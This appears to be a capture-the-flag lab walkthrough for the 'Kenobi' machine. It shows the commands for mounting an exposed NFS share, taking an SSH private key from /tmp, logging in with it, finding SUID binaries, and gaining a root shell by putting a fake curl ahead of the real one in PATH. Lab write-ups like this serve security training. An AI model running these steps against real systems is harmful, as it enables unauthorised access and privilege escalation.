## 💥 Exploitation

### Step 1: Search for an Exploit
- Looking for an exploit for `proftpd 1.3.5` specifically
- Found 4 different exploits, but will be using [this one](http://www.proftpd.org/docs/contrib/mod_copy.html)

### Step 2: Stealing a Private Key with an Open Mount
- Mount kenobi's `/var` into the local machine with the following
    - Make a directory: `mkdir /mnt/kenobiNFS`
    - Mount: `mount 10.146.136.196:/var /mnt/kenobiNFS`
- Navigating to `/tmp`, there is an `id_rsa` file
    - `chmod 600 id_rsa` allows us to get permissions
    - Now, this `id_rsa` can be used to log in to `ssh`
- `ssh -i /mnt/kenobiNFS/tmp/id_rsa kenobi@TARGET_IP`
    - Gives the first flag as `user.txt`

### Step 3: SUID-bit for PrivEsc
- SUID bits can be dangerous
    - In order to look for files with SUID-bits, run `find / -perm -u=s -type f 2>/dev/null`
    - Found an interesting binary file: `/usr/bin/menu`
- Run `/usr/bin/menu`
    - Found 3 options: status check, kernel version, ifconfig
- Use `strings` to find human-readable strings in binary
    - Found some commands:
        - `curl -I localhost`
        - `uname -r`
        - `ifconfig`
    - It seems that each option corresponds to the commands
        - `curl -I localhost` = status check
        - `uname -r` = kernel version
        - `ifconfig` = ifconfig
    - We can use the SUID or privileged execution of this binary and spoof `curl` into a command that actually gives us a root shell and finally put it in our path
        - `echo /bin/sh > /tmp/curl`
        - `chmod 777 /tmp/curl`
        - `export PATH=/tmp:$PATH`
- Run `/usr/bin/menu` with spoofed `curl`
    - This gives the root shell and allows us to become root
